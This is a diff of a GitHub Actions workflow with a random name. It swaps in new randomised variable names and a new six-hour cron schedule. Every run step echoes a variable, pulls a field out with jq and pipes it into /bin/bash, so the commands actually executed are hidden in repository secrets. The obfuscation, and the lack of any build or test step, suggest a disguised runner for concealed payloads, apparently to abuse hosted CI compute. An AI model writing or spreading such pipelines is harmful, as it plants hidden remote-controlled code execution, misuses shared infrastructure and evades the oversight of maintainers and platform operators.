@@ -1,27 +1,28 @@
 name: xunkuangyu2345
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
+    - cron: '39 1/6 * * *'
 
-jobs:  # 4801
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xunkuangyu2345
         env:
-          qmy03: ${{ secrets.qmy03 }}
+          bkrn11746: ${{ secrets.bkrn11746 }}
         run: |
-          echo $qmy03 | jq -r .llo444 | /bin/bash
-          echo $c716 | jq -r .hfcyv1 | /bin/bash
-          echo $jv76840 | jq -r .jsfu7 | /bin/bash
-          echo $zwel750 | jq -r .a7072 | /bin/bash
-          echo $jj6 | jq -r .fnob964 | /bin/bash
-          echo $bvpyq29609 | jq -r .mnksx11 | /bin/bash
-          echo $kt15 | jq -r .rj5548 | /bin/bash
-          echo $oh9 | jq -r .oumo561 | /bin/bash
-          echo $egyh43863 | jq -r .sqwe1 | /bin/bash
+          echo $bkrn11746 | jq -r .dbwom60566 | /bin/bash
+          echo $g5852 | jq -r .og295 | /bin/bash
+          echo $wa6 | jq -r .u4 | /bin/bash
+          echo $ytuz5 | jq -r .a664 | /bin/bash
+          echo $pn096 | jq -r .sxtcv71308 | /bin/bash
+          echo $klau7 | jq -r .agiya06 | /bin/bash
+          echo $hjnf806 | jq -r .gnoau1391 | /bin/bash
+          echo $wnvlq4388 | jq -r .dkv9342 | /bin/bash
+          echo $kwaa81 | jq -r .cyb65 | /bin/bash
+          echo $u2 | jq -r .snv61304 | /bin/bash
+          echo $fqrwy3 | jq -r .e14002 | /bin/bash
+          echo $xcvhy46 | jq -r .nvx4144 | /bin/bash
 
